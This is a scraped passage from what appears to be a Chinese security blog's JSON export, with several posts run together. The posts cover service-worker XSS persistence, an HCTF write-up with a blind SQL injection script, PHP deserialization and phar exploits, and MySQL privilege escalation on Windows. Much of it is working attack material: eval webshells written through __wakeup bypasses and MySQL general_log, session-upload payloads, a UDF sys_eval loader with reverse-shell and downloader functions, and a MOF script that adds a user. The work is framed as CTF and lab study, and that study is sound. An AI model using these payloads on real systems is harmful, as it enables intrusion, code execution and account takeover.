Storage不存在请求的资源时再向服务器请求,cache.put可以选择性地将请求资源加载到cache storage中。如果不手动取消已经注册过的sw服务,刷新/重新打开页面都会启动站点的sw服务，这为我们持久化XSS提供了一定的条件。 查看SW服务Chrome地址栏访问 chrome://serviceworker-internals/，就可以看见已有的后台服务。 注册serviceworker注册点js代码 &lt;script type=&quot;text/javascript&quot;&gt; var url=&quot;//localhost/serviceworker.js&quot;; if (&#39;serviceWorker&#39; in navigator) { navigator.serviceWorker.register(url) .then(function(registration) { console.log(&#39;ServiceWorker registration successful with scope: &#39;, registration.scope); }) }; &lt;/script&gt; normal visitscript标签下的type必须指明为text/javascript event.request.clone()对象的内容如图 攻击条件一个可以XSS的点sw文件可控如果说sw可以放在同源下,也就是js文件可控的话。直接注册Sw，代码如下： // 拦截特定的Url，如果请求是对应的Url，则返回攻击的response self.addEventListener(&#39;fetch&#39;, function (event) { var url = event.request.clone(); body = &#39;&lt;script&gt;alert(&quot;test&quot;)&lt;/script&gt;&#39;; init = {headers: { &#39;Content-Type&#39;: &#39;text/html&#39; }}; if(url.url==&#39;http://localhost/reurl.html&#39;){ res = new Response(body,init); event.respondWith(res.clone()); } });jsonp回调接口利用储值型X点写入下面的代码 当JSONP接口存在缺陷时，比如没有校验回调名。导致返回内容可控比如：url?callback=importScript(…)返回importScript(...)代码实现如下： &lt;?php // JSONP 回调名缺少校验 $cb_name = $_GET[&#39;callback&#39;]; $cb_data = time(); header(&#39;Content-Type: application/javascript&#39;); echo(&quot;$cb_name($cb_data)&quot;);attack_js &lt;script type=&quot;text/javascript&quot;&gt; var url=&quot;//localhost/getdata?callback=importScripts(&#39;//third.com/sw.js?g&#39;)&quot;; if (&#39;serviceWorker&#39; in navigator) { navigator.serviceWorker.register(url) .then(function(registration) { console.log(&#39;ServiceWorker registration successful with scope: &#39;, registration.scope); }) }; &lt;/script&gt;这里面callback回调的事件就相当于sw脚本。当js被执行之后会注册一个sw脚本,内容是回调的事件 或者鸡肋上传一个html到网站下 &lt;html&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=utf-8&quot; /&gt; &lt;body&gt; &lt;script type=&quot;text/javascript&quot;&gt; var url=&quot;//localhost/getdata?callback=importScripts(&#39;//third.com/sw.js?g&#39;)&quot;; if (&#39;serviceWorker&#39; in navigator) { navigator.serviceWorker.register(url) .then(function(registration) { console.log(&#39;ServiceWorker registration successful with scope: &#39;, registration.scope); }) }; &lt;/script&gt; it&#39;s nothing &lt;/body&gt; &lt;/html&gt;局限 存在有缺陷的 JSONP 接口 JSONP 的目录尽可能浅（最好在根目录下），如果放在域的根目录下，将会收到这个域下的所有fetch事件 JSONP 返回的 Content-Type 必须是 JS 类型 存在 XSS 的页面 在网上看到一个师傅这样作例,引用一下：service worker文件被放在这个域的根目录下，这意味着service worker和网站同源。换句话说，这个service work将会收到这个域下的所有fetch事件。如果我将service worker文件注册为/example/sw.js，那么，service worker只能收到/example/路径下的fetch事件（例如： /example/page1/, /example/page2/） Cache缓存污染前文的攻击不涉及cache里的资源,进行的是协商缓存，下面说一下强缓存的利用。 请求资源如果使用cache.put方法，则请求的资源成功后会存在Cache Storage里。如果fetch里写了caches.match(event.request)方法，则每次请求时会先从caches找缓存来优先返回给请求页面。若没有缓存，再进行新的缓存操作。 下面是一个缓存读取/判断的demo // 拦截特定的Url，如果请求是对应的Url，则返回攻击的response。否则用Fetch请求网络上原本的url，进行本地缓存(为了不影响正常功能)) self.addEventListener(&#39;fetch&#39;, function (event) { event.respondWith( //console.log(event.request) caches.match(event.request).then(function(res){ if(res){//如果有缓存则使用缓存 return res; } return requestBackend(event);//没缓存就进行缓存 }) ) }); function requestBackend(event){ var url = event.request.clone(); console.log(url) //打印内容是打印到请求页面 if(url.url==&#39;http://localhost/reurl.html&#39;){//判断是否为需要劫持的资源 return new Response(&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;, {headers: { &#39;Content-Type&#39;: &#39;text/html&#39; }}) } return fetch(url).then(function(res){ //检测是否为有效响应 if(!res || res.status !== 200 || res.type !== &#39;basic&#39;){ return res; } var response = res.clone(); caches.open(&#39;v1&#39;).then(function(cache){ //打开v1缓存进行存储 cache.put(event.request, response); }); return res; }) }分析前几天看ED师傅的研究,发现这种好玩但是鸡肋的方法。上面提到cache.put的方法把js资源添加到Cache Storage，其实如果我们用cache.put把恶意代码插入,覆盖原始的js数据。后果就是当sw请求cahce里的资源时会执行恶意代码。比如workbox会先从缓存读取静态资源,我们用异步请求将恶意代码无限覆盖这个缓存时： 控制台输入下面的恶意代码 async function replay() { const name = &#39;xx&#39; const url = &#39;xx&#39; const payload = ` alert(1); ` let cache = await caches.open(name); let req = new Request(url); let res = new Response(payload + replay + &#39;;replay()&#39;); //执行alert+写入cache内容+执行fn setInterval(_ =&gt; { cache.put(req, res.clone()); }, 500); } replay();就可以在cache Storage里看到500ms刷新并覆盖一次的js资源。 相关链接Service Worker API(https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API) 浏览器缓存知识(https://www.cnblogs.com/lyzg/p/5125934.html)"},{"title":"HCTF2018线上赛部分WriteUp","date":"2018-11-12T16:00:00.000Z","path":"2018/11/13/HCTF题解/","text":"HCTF题解admin思路提示只有admin才能查看 注册账号功能，发现注册大写和小写会提示重名注册。也就是说 ADMIN&lt;=&gt;admin 有一篇文章将Unicode安全，提到的一个python函数canonical_username，这个函数会把类似的unicode字符做一个与chrome的地址栏里相似的转换，举个例子BIG会被转换为big。ᴬᴬᴬ，经过函数处理后变成了AAA 我们注册形似ADMIN的名字 后台函数处理把形似ADMIN转换为ADMIN 修改ADMIN的密码，相当于修改admin的密码 登陆admin获得flag 相当于一个越权 相关链接Unicode安全：http://blog.lnyas.xyz/?p=1411Unicode近似字合集:https://www.compart.com/en/unicode/category/Lm kznoe解析拿到题目发现砝码泄露,down了一份www.zip开始审 一眼看到sql文件，打开看看执行了哪些语句，发现后台账号密码 INSERT INTO `fish_admin` (`id`, `username`, `password`, `name`, `qq`, `per`) VALUES (1, &#39;admin&#39;, &#39;21232f297a57a5a743894a0e4a801fc3&#39;, &#39;小杰&#39;, &#39;1503816935&#39;, 1);登陆失败，被改了密码，开始审计 审计整个钓鱼网站的大致结构：根目录index.php跳转页 admin目录admin目录下是钓鱼后台的管理,login逻辑判断登陆 include目录。include下是配置文件，common入口文件包含了过滤和验证内容，其中: safe.php写了过滤规则，任何GET\\POST\\COOKIE请求的参数会经过filterfunction waf($string) { $blacklist = &#39;/union|ascii|mid|left|greatest|least|substr|sleep|or|benchmark|like|regexp|if|=|-|&lt;|&gt;|\\#|\\s/i&#39;; // and updatexml(1,concat(0x7e,database()) return preg_replace_callback($blacklist, function ($match) { return &#39;@&#39; . $match[0] . &#39;@&#39;; }, $string); } function safe($string){ if (is_array($string)) { foreach ($string as $key =&gt; $val) { $string[$key] = safe($val); } } else { $string = waf($string); } return $string;} 匹配到这些会在关键字前后添加@ 2. member根据cookie判断是否已经登陆 3. founction封装了一些功能函数 4. db.class一些执行的sql语句 ## 思路 ### ip 刚开始审的时候看到了insert把ip入库，而且ip的获取是这样的： ![](https://i.loli.net/2018/11/13/5beac380388eb.jpg) 不用经过safe的过滤，但是下面的ip2long会把超限度的ip置空，因此ip注入行不通 ### bypass 因为有全局过滤safe，所以一开始在想可不可以bypass掉，用hex绕过is_number的检测，使我们注入的语句不会经过filter。确实成功执行了我用hex传入的语句，但是mysql仅仅是把hex的值入库了，也无法进行二次利用。 ### member.php 当时他们说可以用json形式的cookie注入,unicode编码绕过于是去看cookie逻辑登陆的地方 ![](https://i.loli.net/2018/11/13/5beac35ebedb4.png) cookie传入参数login_data解析查库，用了json_decode，那么就可以用unicode编码无视过滤 ![](https://i.loli.net/2018/11/13/5beac38e39abe.png) 剩下的就是编写tamper脚本了，把payload替换成unicode。但是看到了微笑师傅的一个py脚本，不借助sqlmap，觉得写的很好，贴出来-- coding: utf-8 --import requestsimport string url = ‘http://kzone.2018.hctf.io/include/common.php&#39;str1 = string.ascii_letters+string.digits+’{}!@#$*&amp;_,’ def check(payload): cookie={ ‘PHPSESSID’:’8ehnp28ccr4ueh3gnfc3uqtau1’, ‘islogin’:’1’, ‘login_data’:payload } try: requests.get(url,cookies=cookie,timeout=3) return 0 except: return 1 result=’’for i in range(1,33): for j in str1: payload = ‘{“admin_user”:”admin&#39;//and//\\u0069f(\\u0061scii(\\u0073ubstr((select//table_name//from//inf\\u006Frmation_schema.tables//where//table_schema\\u003ddatabase()//limit//0,1),%s,1))\\u003d&#39;%s&#39;,\\u0073leep(4),1)//and//&#39;1”}’% (str(i),ord(j)) payload = ‘{“admin_user”:”admin&#39;//and//\\u0069f(\\u0061scii(\\u0073ubstr((select//F1a9//from//F1444g),%s,1))\\u003d%s,\\u0073leep(4),1)//and//&#39;1”,”admin_pass”:”123”}’% (str(i),ord(j)) #print(‘[+]’+payload) if check(payload): result += j break print(result) 只要是请求的页面包含common.php此脚本都能行得通，因为会引入member.php"},{"title":"ISCC2018 信阳杯线下赛小结","date":"2018-10-21T16:00:00.000Z","path":"2018/10/22/ISCC2018 信阳杯线下赛小结/","text":"自己巨大的锅..感觉本能拿第一的，却只水了个第二。 从这篇起以后的日子闭关反思 线下ctf上午的线下ctf就不说了,一个misc两个逆向。web狗：？？？而且misc巨坑，感觉也是比脑洞，b32出来了对比hex还原再crc32。当时B32解出来有乱码，一直在测试编码的道路上，但结束后问了西工的师傅们才发现路走偏了。要学会习惯用winhex分析，跟原始的zip比对….这就解释了为什么有个504的文件头了..总之ctf体验极差 高地赛当时拿到题目是两个私地，一个pwn，一个web.高地也是一个pwn看到网上有这么个吐槽：选手：“ISCC你又出新题啦！” 当时看到题,第一反应是17年的原题,ez的前端太好辨识了..最扯淡的是，给了Mongodb的配置和17年的也一样..甚至连后台账号密码都没变。不过一开始我万能密码也进去了。但自己菜的也是真实，作为第一个打全场的队伍，后来权限没稳住又被别人反超… Always onload，还有很多要学的"},{"title":"四个实例递进php反序列化","date":"2018-09-13T11:29:12.000Z","path":"2018/09/13/四个实例递进php反序列化/","text":"##声明文章首发于安全客：https://www.anquanke.com/post/id/159206 索引最近在总结php序列化相关的知识，看了好多前辈师傅的文章，决定对四个理解难度递进的序列化思路进行一个复现剖析。包括最近Blackhat议题披露的phar拓展php反序列化漏洞攻击面。前人栽树，后人乘凉，担着前辈师傅们的辅拓前行！ D0g3为了让大家进入状态，来一道简单的反序列化小题，新来的表哥们可以先学习一下php序列化和反序列化。顺便安利一下D0g3小组的平台，后面会有题不断上新哦~题目平台地址：http://ctf.d0g3.cn题目入口：http://120.79.33.253:9001 页面给了源码 &lt;?php error_reporting(0); include &quot;flag.php&quot;; $KEY = &quot;D0g3!!!&quot;; $str = $_GET[&#39;str&#39;]; if (unserialize($str) === &quot;$KEY&quot;) { echo &quot;$flag&quot;; } show_source(__FILE__);提醒大家补充php序列化知识的水题~ 直接上传s:7:&quot;D0g3!!!&quot;即可get flag 绕过魔法函数的反序列化漏洞漏洞编号CVE-2016-7124 魔法函数__sleep() 和 __wakeup()php文档中定义__wakeup(): unserialize() 执行时会检查是否存在一个 wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。wakeup()经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。__sleep()则相反，是用在序列化一个对象时被调用 漏洞剖析PHP5 &lt; 5.6.25PHP7 &lt; 7.0.10PHP官方给了示例：https://bugs.php.net/bug.php?id=72663这个漏洞核心：序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行比如下面这个类构造： class hpdoger{ public $a = &#39;nice to meet u&#39;; }序列化这个类得到的结果： O:7:&quot;hpdoger&quot;:1:{s:1:&quot;a&quot;;s:6:&quot;nice to meet u&quot;;}简单解释一下这个序列化字符串：O代表结构类型为：类，7表示类名长度，接着是类名、属性（成员）个数大括号内分别是：属性名类型、长度、名称；值类型、长度、值 正常情况下，反序列化一个类得到的结果： 析构方法和__wakeup都能够执行 如果我们把传入的序列化字符串的属性个数更改成大于1的任何数 O:7:&quot;hpdoger&quot;:2:{s:1:&quot;a&quot;;s:6:&quot;u know&quot;;}得到的结果如图，__wakeup没有被执行，但是执行了析构函数 假如我们的demo是这样的呢? &lt;?php class A{ var $a = &quot;test&quot;; function __destruct(){ $fp = fopen(&quot;D:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\test\\\\shell.php&quot;,&quot;w&quot;); fputs($fp,$this-&gt;a); fclose($fp); } function __wakeup() { foreach(get_object_vars($this) as $k =&gt; $v) { $this-&gt;$k = null; } } } $hpdoger = $_POST[&#39;hpdoger&#39;]; $clan = unserialize($hpdoger); ?&gt;每次反序列化是都会调用__wakeup从而把$a值清空。但是，如果我们绕过wakeup不就能写Shell了？既然反序列化的内容是可控的，就利用上述的方法绕过wakeup。 poc: O:1:&quot;A&quot;:2:{s:1:&quot;a&quot;;s:27:&quot;&lt;?php eval($_POST[&quot;hp&quot;]);?&gt;&quot;;}序列化漏洞常见的魔法函数__construct():当一个类被创建时自动调用__destruct():当一个类被销毁时自动调用__invoke():当把一个类当作函数使用时自动调用__tostring():当把一个类当作字符串使用时自动调用__wakeup():当调用unserialize()函数时自动调用__sleep():当调用serialize()函数时自动调用__call():当要调用的方法不存在或权限不足时自动调用 Session反序列化漏洞Session序列化机制提到这个漏洞，就得先知道什么叫Session序列化机制。 当session_start()被调用或者php.ini中session.auto_start为1时，PHP内部调用会话管理器，访问用户session被序列化以后，存储到指定目录（默认为/tmp）。 PHP处理器的三种序列化方式：| 处理器 | 对应的存储格式 || —————— |:———————|| php_binary | 键名的长度对应的ASCII字符＋键名＋经过serialize() 函数反序列处理的值 || php | 键名＋竖线＋经过serialize()函数反序列处理的值 ||php_serialize |serialize()函数反序列处理数组方式| 配置文件php.ini中含有这几个与session存储配置相关的配置项： session.save_path=&quot;&quot; --设置session的存储路径,默认在/tmp session.auto_start --指定会话模块是否在请求开始时启动一个会话,默认为0不启动 session.serialize_handler --定义用来序列化/反序列化的处理器名字。默认使用php一个简单的demo(session.php)认识一下存储过程： &lt;?php ini_set(&#39;session.serialize_handler&#39;,&#39;php_serialize&#39;); session_start(); $_SESSION[&#39;hpdoger&#39;] = $_GET[&#39;hpdoger&#39;]; ?&gt;访问页面 http://localhost/test/session.php?hpdoger=lover在session.save_path对应路径下会生成一个文件，名称例如:sess_1ja9n59ssk975tff3r0b2sojd5因为选择的序列化处理方式为php_serialize,所以是被serialize()函数处理过的$_SESSION[‘hpdoger’]。存储文件内容： a:1:{s:7:&quot;hpdoger&quot;;s:5:&quot;lover&quot;;}如果选择的序列化处理方式为php，即ini_set(&#39;session.serialize_handler&#39;,&#39;php&#39;);,则存储内容为： hpdoger|s:5:&quot;lover&quot;;漏洞剖析选择的处理方式不同，序列化和反序列化的方式亦不同。如果网站序列化并存储Session与反序列化并读取Session的方式不同，就可能导致漏洞的产生。 这里提供一个demo： 存储Session页面 /*session.php*/ &lt;?php ini_set(&#39;session.serialize_handler&#39;,&#39;php_serialize&#39;); session_start(); $_SESSION[&#39;hpdoger&#39;] = $_GET[&#39;hpdoger&#39;]; ?&gt;可利用页面 /*test.php*/ &lt;?php ini_set(&#39;session.serialize_handler&#39;,&#39;php&#39;); session_start(); class hpdoger{ var $a; function __destruct(){ $fp = fopen(&quot;D:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\test\\\\shell.php&quot;,&quot;w&quot;); fputs($fp,$this-&gt;a); fclose($fp); } } ?&gt;访问第一个页面的poc: /tmp目录下生成的session文件内容： a:1:{s:7:&quot;hpdoger&quot;;s:52:&quot;|O:7:&quot;hpdoger&quot;:1:{s:1:&quot;a&quot;;s:17:&quot;&lt;?php phpinfo()?&gt;&quot;;}&quot;;}再访问test.php时反序列化已存储的session，新的php处理方式会把“|”后的值当作KEY值再serialize()，相当于我们实例化了这个页面的hpdoger类，相当于执行: $_SESSION[&#39;hpdoger&#39;] = new hpdoger(); $_SESSION[&#39;hpdoger&#39;]-&gt;a = &#39;&lt;?php phpinfo()?&gt;&#39;;在指定的目录D:\\phpStudy\\PHPTutorial\\WWW\\test\\shell.php中会写入内容&lt;?php phpinfo()?&gt; jarvisoj-web的一道SESSION反序列化题目入口(http://web.jarvisoj.com:32784/index.php)Index页给源码： &lt;?php //A webshell is wait for you ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;); session_start(); class OowoO { public $mdzz; function __construct() { $this-&gt;mdzz = &#39;phpinfo();&#39;; } function __destruct() { eval($this-&gt;mdzz); } } if(isset($_GET[&#39;phpinfo&#39;])) { $m = new OowoO(); } else { highlight_string(file_get_contents(&#39;index.php&#39;)); } ?&gt;看到ini_set(‘session.serialize_handler’, ‘php’); 暂时没找到用php_serialize添加session的方法。但看到当get传入phpinfo时会实例化OowoO这个类并访问phpinfo() 这里参考Chybeta师傅的一个姿势：session.upload_progress.enabled为On。session.upload_progress.enabled本身作用不大，是用来检测一个文件上传的进度。但当一个文件上传时，同时POST一个与php.ini中session.upload_progress.name同名的变量时（session.upload_progress.name的变量值默认为PHP_SESSION_UPLOAD_PROGRESS），PHP检测到这种同名请求会在$_SESSION中添加一条数据。我们由此来设置session。 构造上传的表单poc，列出当前目录: &lt;form action=&quot;http://web.jarvisoj.com:32784/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;|O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:26:&quot;print_r(scandir(__dir__));&quot;;}&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; /&gt; &lt;/form&gt;通过phpinfo页面查看当前路径_SERVER[&quot;SCRIPT_FILENAME&quot;] 读文件就行 |O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:88:&quot;print_r(file_get_contents(/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php));&quot;;}得到flag CTF{4d96e37f4be998c50aa586de4ada354a}phar伪协议触发php反序列化最近Black Hat比较热的一个议题：It’s a PHP unserialization vulnerability Jim, but not as we know it。参考了创宇的文章，这里笔者把它作为php反序列化的最后一个模块，希望日后能在以上的几种反序列化之外拓宽新的思路。 phar://协议可以将多个文件归入一个本地文件夹，也可以包含一个文件 phar文件PHAR（PHP归档）文件是一种打包格式，通过将许多PHP代码文件和其他资源（例如图像，样式表等）捆绑到一个归档文件中来实现应用程序和库的分发。所有PHAR文件都使用.phar作为文件扩展名，PHAR格式的归档需要使用自己写的PHP代码。 phar文件结构详情参考php手册(https://secure.php.net/phar) 这里摘出创宇提供的四部分结构概要：1、a stub识别phar拓展的标识，格式:xxx。对应的函数Phar::setStub 2、a manifest describing the contents被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是漏洞利用的核心部分。对应函数Phar::setMetadata–设置phar归档元数据 3、 the file contents被压缩文件的内容。 4、[optional] a signature for verifying Phar integrity (phar file format only)签名，放在文件末尾。对应函数Phar :: stopBuffering –停止缓冲对Phar存档的写入请求，并将更改保存到磁盘 Phar内置方法要想使用Phar类里的方法，必须将phar.readonly配置项配置为0或Off（文档中定义） PHP内置phar类，其他的一些方法如下： $phar = new Phar(&#39;phar/hpdoger.phar&#39;); //实例一个phar对象供后续操作 $phar-&gt;startBuffering() //开始缓冲Phar写操作 $phar-&gt;addFromString(&#39;test.php&#39;,&#39;&lt;?php echo \\&#39;this is test file\\&#39;;&#39;); //以字符串的形式添加一个文件到 phar 档案 $phar-&gt;buildFromDirectory(&#39;fileTophar&#39;) //把一个目录下的文件归档到phar档案 $phar-&gt;extractTo() //解压一个phar包的函数，extractTo 提取phar文档内容漏洞剖析文件的第二部分a manifest describing the contents可知，phar文件会以序列化的形式存储用户自定义的meta-data，在一些文件操作函数执行的参数可控，参数部分我们利用Phar伪协议，可以不依赖unserialize()直接进行反序列化操作，在读取phar文件里的数据时反序列化meta-data，达到我们的操控目的。 而在一些上传点，我们可以更改phar的文件头并且修改其后缀名绕过检测，如：test.gif，里面的meta-data却是我们提前写入的恶意代码，而且可利用的文件操作函数又很多，所以这是一种不错的绕过+执行的方法。 文件上传绕过deomo自己写了个丑陋的代码，只允许gif文件上传（实则有其他方法绕过，这里不赘述），代码部分如下 前端上传： &lt;form action=&quot;http://localhost/test/upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;file&quot; name=&quot;hpdoger&quot;&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot;&gt; &lt;/form&gt;后端验证： /*upload.php*/ &lt;?php /*返回后缀名函数*/ function getExt($filename){ return substr($filename,strripos($filename,&#39;.&#39;)+1); } /*检测MIME类型是否为gif*/ if($_FILES[&#39;hpdoger&#39;][&#39;type&#39;] != &quot;image/gif&quot;){ echo &quot;Not allowed !&quot;; exit; } else{ $filenameExt = strtolower(getExt($_FILES[&#39;hpdoger&#39;][&#39;name&#39;])); /*提取后缀名*/ if($filenameExt != &#39;gif&#39;){ echo &quot;Not gif !&quot;; } else{ move_uploaded_file($_FILES[&#39;hpdoger&#39;][&#39;tmp_name&#39;], $_FILES[&#39;hpdoger&#39;][&#39;name&#39;]); echo &quot;Successfully！&quot;; } } ?&gt;代码判断了MIME类型+后缀判断，如下是我测试php文件的两个结果：直接上传php 抓包更改content-type为 image/gif再次上传 可以看到两次都被拒绝上传,那我们更改phar后缀名再次上传 php环境编译生成一个phar文件，代码如下： &lt;?php class not_useful{ var $file = &quot;&lt;?php phpinfo() ?&gt;&quot;; } @unlink(&quot;hpdoger.phar&quot;); $test = new not_useful(); $phar = new Phar(&quot;hpdoger.phar&quot;); $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); // 增加gif文件头 $phar-&gt;setMetadata($test); $phar-&gt;addFromString(&quot;test.txt&quot;,&quot;test&quot;); $phar-&gt;stopBuffering(); ?&gt;这里实例的类是为后面的demo做铺垫，php文件同目录下生成hpdoger.phar文件，我们更改名称为hpdoger.gif看一下 gif头、phar识别序列、序列化后的字符串都具备 上传一下看能否成功,成功绕过检测在服务端存储一个hpdoger.gif 利用Phar://伪协议demo我们已经上传了可解析的phar文件，现在需要找到一个文件操作函数的页面来利用，这里笔者写一个比较鸡肋的页面，目的是还原流程而非真实情况。 代码如下:reapperance.php &lt;?php $recieve = $_GET[&#39;recieve&#39;]; /*写入文件类操作*/ class not_useful{ var $file; function __destruct(){ $fp = fopen(&quot;D:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\test\\\\shell.php&quot;,&quot;w&quot;); //自定义写入路径 fputs($fp,$this-&gt;file); fclose($fp); } file_get_contents($recieve); ?&gt;$recieve可控，符合我们的利用条件。那我们构造payload: 若执行成功，会将刚才写入meta-data数据里面序列化的类进行反序列化，并且实例了$file成员，导致文件写入，成功写入如下： 可利用的文件操作函数fileatime、filectime、file_exists、file_get_contents、file_put_contents、file、filegroup、fopen、fileinode、filemtime、fileowner、fileperms、is_dir、is_executable、is_file、is_link、is_readable、is_writable、is_writeable、parse_ini_file、copy、unlink、stat、readfile、md5_file、filesize 各种文件头 类型 标识 JPEG 头标识ff d8 ,结束标识ff d9 PNG 头标识89 50 4E 47 0D 0A 1A 0A GIF 头标识(6 bytes) 47 49 46 38 39(37) 61 GIF89(7)a BMP 头标识(2 bytes) 42 4D BM 相关链接jarvisoj-web-writeup(https://chybeta.github.io/2017/07/05/jarvisoj-web-writeup/#PHPINFO)利用 phar 拓展 php 反序列化漏洞攻击面(https://paper.seebug.org/680/)"},{"title":"基于Windows下mysql的一些提权分析","date":"2018-09-08T09:32:18.000Z","path":"2018/09/08/基于Windows下mysql的一些提权分析/","text":"索引这篇文章是写基于windows环境下的一些mysql提权方法的分析并利用。这些方法老生常谈，但困于很多文章在讲分析和利用的时候模棱两可，因此想总结一下常见的方法思路。基于windows的提权姿势多的数不胜数，一般在配置文件可以嗅探到root密码的情况（root密码已知）下，或者注入、爆破拿到root密码下，可以考虑mysql提权。文章内容很基础，下面对这些方法进行一些粗谈，有什么理解错误的地方还请客观们轻打…大佬们可以略过这篇文章qaq… 实验环境靶机A： Windows 7 SP1靶机B： Windows server 2003 enterprise x64Phpstudy搭建的php+mysqlphp版本：5.4.45mysql版本：5.5.53攻击环境：已知root账号密码，网站存在phpmyadmin页面 通过phpmyadmin来getshell简单测试利用log变量，猜一下绝对路径看到phpstudy，猜测根目录在WWW下，into outfile写个马测一下能传不果然是用不成into outfile，因为file_priv为null，那么尝试使用日志写马 利用日志写shell开启日志记录 set global general_log=&#39;on&#39;;日志文件导出指定目录 set global general_log_file=&#39;C:/phpstudy/WWW/hp.php&#39;;记录sql语句写马，这里我就是演示一下，没有安全狗，直接传原马 select &#39;&lt;?php @eval($_POST[&quot;hp&quot;]); ?&gt;&#39;;关闭记录 set global general_log=off;菜刀连接url: 192.168.11.106/hp.php看一下权限，普通成员hpd0egr，创建用户错误5。接下来开始提权之路！ UDF提权什么是UDFUDF(user-defined function)是MySQL的一个拓展接口，也可称之为用户自定义函数，它是用来拓展MySQL的技术手段，可以说是数据库功能的一种扩展，用户通过自定义函数来实现在MySQL中无法方便实现的功能，其添加的新函数都可以在SQL语句中调用，就像本机函数如ABS()或SOUNDEX()一样方便。 提权原理先学习一下什么叫动态链接库 动态链接库动态链接库：是把程序代码中会使用的函数编译成机器码，不过是保存在.dll文件中。另外在编译时，不会把函数的机器码复制一份到可执行文件中。编译器只会在.exe的执行文件里，说明所要调用的函数放在哪一个*.dll文件。程序执行使用到这些函数时，操作系统会把dll文件中的函数拿出来给执行文件使用 提权分析udf是Mysql类提权的方式之一。前提是已知mysql中root的账号密码，我们在拿到webshell后，可以看网站根目录下的config.php里，一般都有mysql的账号密码。利用root权限，创建带有调用cmd函数的’udf.dll’(动态链接库)。当我们把’udf.dll’导出指定文件夹引入Mysql时，其中的调用函数拿出来当作mysql的函数使用。这样我们自定义的函数才被当作本机函数执行。在使用CREAT FUNCITON调用dll中的函数后，mysql账号转化为system权限，从而来提权。 提权复现工具这里我用暗月的马，改了一些参数。后面我会把所有工具打包 访问提权马 导出dll到指定目录利用提权马将写在其中的二进制导出一个dll到指定目录，但导出的dll文件路径有要求 Mysql版本小于5.1版本。udf.dll文件在Windows2003下放置于c:\\windows\\system32，在windows2000下放置于c:\\winnt\\system32。 Mysql版本大于5.1版本udf.dll文件必须放置于MYSQL安装目录下的lib\\plugin文件夹下。 但是大于5.1版本的时候没有plugin这个文件夹，需要我们自己创建。 靶机mysql版本为5.5，那我们只能自己创建一个plugin文件夹了，先用select @@basedir;获取安装目录。 在该目录下创建一个plugin文件夹，网上有大神说可以用ntfs创建目录，感兴趣的话可以研究一下，我这里直接菜刀新建 这个提权马自带的导出要用到Into dumpfile，但是file_priv为Null这个问题限制了我们，就算我们修改了my.ini文件也要重启mysql，那我们直接传一个dll上去吧，文件名为hpudf.dll如图 将udf的自定义函数引入我们刚才只是把udf的动态链接库导出到指定文件夹，还不能使用里面的自定义函数。要想使用自定义函数，就要把udf.dll中的自定义函数引入。 引入sys_eval函数： CREATE FUNCTION sys_eval RETURNS STRING SONAME &#39;hpudf.dll&#39;其中，sys_eval函数是执行任意命令，并将输出返回函数的名字，hpudf.dll是你导出文件的名字; 常见的函数如下： cmdshell 执行cmd; downloader 下载者,到网上下载指定文件并保存到指定目录; open3389 通用开3389终端服务,可指定端口(不改端口无需重启); backshell 反弹Shell; ProcessView 枚举系统进程; KillProcess 终止指定进程; regread 读注册表; regwrite 写注册表; shut 关机,注销,重启; about 说明与帮助函数;执行命令执行命令模板： select sys_eval(&#39;ipconfig)添加用户/管理员 查看一下用户 get it~ MOF提权MOF提权的条件要求十分严苛： windows 03及以下版本 mysql启动身份具有权限去读写c:/windows/system32/wbem/mof目录 secure-file-priv参数不为null mysql以root身份启动，具有c盘下system32/wbem/mof这点权限的要求，就已经非常严格了。。而且win7 sp1就已经没有这个nullevt.mof这个文件了，那么这里记一下poc，来对windows 03的机子进行验证。 MOF文件托管对象格式 (MOF) 文件是创建和注册提供程序、事件类别和事件的简便方法。文件路径为：c:/windows/system32/wbme/mof/，其作用是每隔五秒就会去监控进程创建和死亡。 提权原理MOF文件每五秒就会执行，而且是系统权限，我们通过mysql使用load_file 将文件写入/wbme/mof，然后系统每隔五秒就会执行一次我们上传的MOF。MOF当中有一段是vbs脚本，我们可以通过控制这段vbs脚本的内容让系统执行命令，进行提权。 公开的nullevt.mof利用代码#pragma namespace(&quot;\\\\\\\\.\\\\root\\\\subscription&quot;) instance of __EventFilter as $EventFilter { EventNamespace = &quot;Root\\\\Cimv2&quot;; Name = &quot;filtP2&quot;; Query = &quot;Select * From __InstanceModificationEvent &quot; &quot;Where TargetInstance Isa \\&quot;Win32_LocalTime\\&quot; &quot; &quot;And TargetInstance.Second = 5&quot;; QueryLanguage = &quot;WQL&quot;; }; instance of ActiveScriptEventConsumer as $Consumer { Name = &quot;consPCSV2&quot;; ScriptingEngine = &quot;JScript&quot;; ScriptText = &quot;var WSH = new ActiveXObject(\\&quot;WScript.Shell\\&quot;)\\nWSH.run(\\&quot;net.exe user hpdoger 123456 /add\\&quot;)&quot;; }; instance of __FilterToConsumerBinding { Consumer = $Consumer; Filter = $EventFilter; };MOF文件利用将上面的脚本上传到有读写权限的目录下： 这里我上传到了C:\\Documents and Settings\\test 根据前面的phpmyadmin，我们使用sql语句将文件导入到c:/windows/system32/wbem/mof/下payload: select load_file(&quot;C:/Documents and Settings/testtest.mof&quot;) into dumpfile 